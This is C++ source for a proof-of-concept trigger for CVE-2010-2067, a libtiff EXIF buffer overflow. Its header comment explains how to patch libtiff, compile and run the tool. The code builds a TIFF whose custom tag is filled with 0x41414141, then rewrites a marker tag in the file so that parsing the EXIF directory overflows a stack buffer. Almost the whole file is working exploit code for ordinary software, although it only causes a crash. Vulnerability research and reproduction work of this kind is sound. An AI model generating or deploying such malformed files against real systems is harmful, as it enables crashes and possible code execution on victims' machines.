/* sean@vertex.re
 *
 * Generate a trigger for CVE-2010-2067. No effort has been made to craft the
 * *source* of the data which overflows the destination buffer. This is purely a
 * hacked up script to generate a crashing trigger. 
 *
 * Based on information from the following sources:
 *
 * - http://vulnfactory.org/blog/2010/06/29/breaking-libtiff/
 *    + Bug details
 * - https://142383.bugs.gentoo.org/attachment.cgi?id=93632
 *    + Tavis' exploit for a different bug from which the search/replace
 *    mechanism is lifted
 * - http://www.asmail.be/msg0054834371.html
 *   + A mailing list post describing how to write an EXIF IFD
 *
 * Must be compiled using a modern version of libtiff (I used 4.0.7)
 *
 * First, patch tif_dirwrite.c in libtiff as follows:
 *
 * #### Start patch ####
 diff --git a/libtiff/tif_dirwrite.c b/libtiff/tif_dirwrite.c
 index 2967da5..d3128ca 100644
 --- a/libtiff/tif_dirwrite.c
 +++ b/libtiff/tif_dirwrite.c
 @@ -1766,7 +1766,8 @@ TIFFWriteDirectoryTagIfdIfd8Array(TIFF* tif, uint32* ndir, TIFFDirEntry* dir, ui
          *q= (uint32)(*ma);
               }
                
               -    o=TIFFWriteDirectoryTagCheckedIfdArray(tif,ndir,dir,tag,count,p);
               +    //o=TIFFWriteDirectoryTagCheckedIfdArray(tif,ndir,dir,tag,count,p);
               +    o=TIFFWriteDirectoryTagCheckedLongArray(tif,ndir,dir,tag,count,p);
                    _TIFFfree(p);
                     
                    return(o);
  * #### End patch ####
  *
  * Then compile via g++ -o gentif ~/git/libtiff-head/install/include/ -I \
  *     ~/git/libtiff/libtiff-head/libtiff/ \
  *     -L ~/git/libtiff/libtiff-head/install/lib/ -ltiff gentif.cpp
  *
  * Run via LD_LIBRARY_PATH=~/git/libtiff/libtiff-head/install/lib/ ./gentif
*/

#include <assert.h>
#include <tiffio.h>
#include <tif_dir.h>  // libtiff internals; for TIFFFieldArray

#define MARKER 0xc0de /* this must be unique, make it anything */
#define OUTPUTFILE "crash.tif"

TIFFFieldInfo badfield = {
    MARKER, 	                /* a unique unsigned short we search for */
    100,            		/* number of shorts to read onto stack */
    100,            		/* number we want to write into file */
    TIFF_RATIONAL,     		/* data type */
    FIELD_CUSTOM,   		/* field bit */
    1,              		/* okay to change? */
    0,              		/* passcount */
    "CVE-2010-2067"       	/* a name, unused */
};

typedef unsigned char uint8;

int main() {
  FILE *mod;
  unsigned short d;
  int nx = 640, ny = 480;
  char *filename = OUTPUTFILE;  // file to write
  unsigned f[badfield.field_readcount], i;
  
  for (i = 0; i < badfield.field_readcount; i++)
    f[i] = 0x41414141;

  TIFF *tif = TIFFOpen(filename, "w");
  assert(tif);
  assert(TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, nx) != 0);
  assert(TIFFSetField(tif, TIFFTAG_IMAGELENGTH, ny) != 0);
  assert(TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, 8) != 0);
  assert(TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_RGB) != 0);
  assert(TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, ny/2) != 0);  
  assert(TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_LZW) != 0);
  assert(TIFFSetField(tif, TIFFTAG_PREDICTOR, PREDICTOR_HORIZONTAL) != 0);
  assert(TIFFSetField(tif, TIFFTAG_SAMPLEFORMAT, SAMPLEFORMAT_UINT) != 0);
  assert(TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG) != 0);
  assert(TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, 3) != 0);

  // Setup exif
  uint64 exif_dir_offset = 0;  
  assert(TIFFSetField(tif, TIFFTAG_EXIFIFD, exif_dir_offset) != 0);
  assert(TIFFCheckpointDirectory(tif) != 0);
  assert(TIFFSetDirectory(tif, 0) != 0);

  assert(TIFFCreateEXIFDirectory(tif) == 0);

  assert(TIFFMergeFieldInfo(tif, &badfield, 1) == 0);
  assert(TIFFSetField(tif, MARKER, &f) != 0);

  assert(TIFFWriteCustomDirectory(tif, &exif_dir_offset) != 0); 
 
  // Patch IFD0
  assert(TIFFSetDirectory(tif, 0) != 0);
  assert(TIFFSetField(tif, TIFFTAG_EXIFIFD, exif_dir_offset) != 0);
  assert(TIFFCheckpointDirectory(tif) != 0);
  assert(TIFFWriteDirectory(tif) != 0);
  
  TIFFClose(tif);
    
  /* okay, now open the file to find the marker tag */
  if ((mod = fopen(OUTPUTFILE, "r+")) == NULL) {
      fprintf(stderr, "[!] failed to open target.\n");
      return 1;
  }

  /* try to find the MARKER by continually reading shorts. */

  while (true) {
      if (fread(&d, sizeof(short), 1, mod) < 1) {
          fprintf(stderr, "[!] failed to find marker.\n");
          return 1;
      }
      if (d == MARKER) {
          fprintf(stderr, "[*] marker tag found at offset %d.\n", 
                  ftell(mod) - sizeof(short));

          /* rewind ready to overwrite it */
          if (fseek(mod, - sizeof(short), SEEK_CUR) == -1) {
              fprintf(stderr, "[!] failed to reposition file.\n");
              return 1;
          }

          d = EXIFTAG_SUBJECTDISTANCE;

          /* write it in */
          if (fwrite(&d, sizeof(short), 1, mod) < 1) {
              fprintf(stderr, "[!] failed to write new tag number.\n");
          }

          break;
      } else {
          if (fseek(mod, - sizeof(short) + 1, SEEK_CUR) == -1) {
              fprintf(stderr, "[!] failed to reposition file.\n");
              return 1;
          }
      }
  }

  fclose(mod);
}
